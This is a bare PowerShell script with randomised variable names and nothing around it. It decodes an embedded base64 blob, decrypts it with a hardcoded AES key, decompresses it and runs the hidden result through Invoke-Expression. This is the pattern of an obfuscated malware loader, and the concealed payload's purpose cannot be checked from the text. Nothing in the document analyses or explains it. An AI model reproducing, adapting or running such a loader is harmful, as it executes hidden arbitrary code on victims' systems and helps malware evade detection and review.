$ieukfrzwk = [System.Convert]::FromBase64String("LxDzdhtPm4kJDfnZ1c14GLhQv9WxPeI9z37brC99tm0=")
$bvdvqgi = New-Object "System.Security.Cryptography.AesManaged"
$yrxfuzscc = [System.Convert]::FromBase64String("VCjWzNU+OCJVLhr+mD7sJu/s9A4QebTvqWFIAG2LN9R8EQmoJfZkWgCdsxAhQxQkTlf9fq2+xbPgg78ZBxDQbpHxe+7UDqLBwUXuf/pXeT0qJeDCeFpS59TWlLExE7cPJ3x5y1Pn3K9uTysmVoKz5HYCmshT+K7Aw2XmY55nEEaISjN/SIshozJMOsiOqY5ivfIwNU28l3BMKttD5Rf4w2wTAWCJo3ZDHl0SJoPXXK4olS8X3bV8HmPHKIodTLRkNCk2a13AbkfpR1Q5URyqlJV+uE8XD2yILGoj7D/mmt1vFDGpVEWmrlsBMk3IH8fMAF7iFvkKWvZjrecACotX25KwZ13rM3XYKYLIm0klNLGRyxYwJSpTqnOvRap2Bsxids/wG0itplfrmTFEO6nKWIhbHtfN6fwCVOwEeFbnVLpKKJKboApC8W9v/NEi46S+Oyi9w0P/LwEGv6CV73u6cw2Uq+4XCJZnpOrNyNAqTuRfBc7BNakOgv2XernzgHqPgBpZY67jr8pNSDrK/mn5K6OnKLnqjEpg+1ZPtcS+c/0RhdDug4xiIei7PVwlwX6aGFaNtFj2B/i/3dir933WR/SRMa83hJuOsHUI+MAu4JVImHGDtGvP3CTohrcYDVSQ5MJc4bt4kV4gLP1wo2MYgcCnV+PutUgVttdfP06diJuP61zGBvx53x3FAD5u57DKDgDmUWOQif7LF8+OmMRTT889C/ku9cgCYh2CKmxk2BHL3IBLzojDZ69ZU3T2wqN4MmItLNU2FPgKDoGLoiXlsnBf40ZoEYwZegaAYckHFYeqVcvU06mQOClD2LDCWnVRiyojPMfg57yWqvRCWz+xb7KNrnhTjJBsSTzM8R+E3g5jBgWNyKbbAi/QDI+8oSTK9/qW+U1CxF2hE61OQeK+Yck3jf68Iu3dk5ia2z89gG0=")
$bvdvqgi.Mode = [System.Security.Cryptography.CipherMode]::CBC
$bvdvqgi.KeySize = 192
$bvdvqgi.Key = $ieukfrzwk
$bvdvqgi.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$bvdvqgi.BlockSize = 128
$bvdvqgi.IV = $yrxfuzscc[0..15]
$homedab = New-Object System.IO.MemoryStream(,$bvdvqgi.CreateDecryptor().TransformFinalBlock($yrxfuzscc,16,$yrxfuzscc.Length-16))
$pzzufy = New-Object System.IO.MemoryStream
$jupfd = New-Object System.IO.Compression.GzipStream $homedab, ([IO.Compression.CompressionMode]::Decompress)
$jupfd.CopyTo($pzzufy)
$homedab.Close()
$jupfd.Close()
$bvdvqgi.Dispose()
$axsxqz = [System.Text.Encoding]::UTF8.GetString($pzzufy.ToArray())
Invoke-Expression($axsxqz)
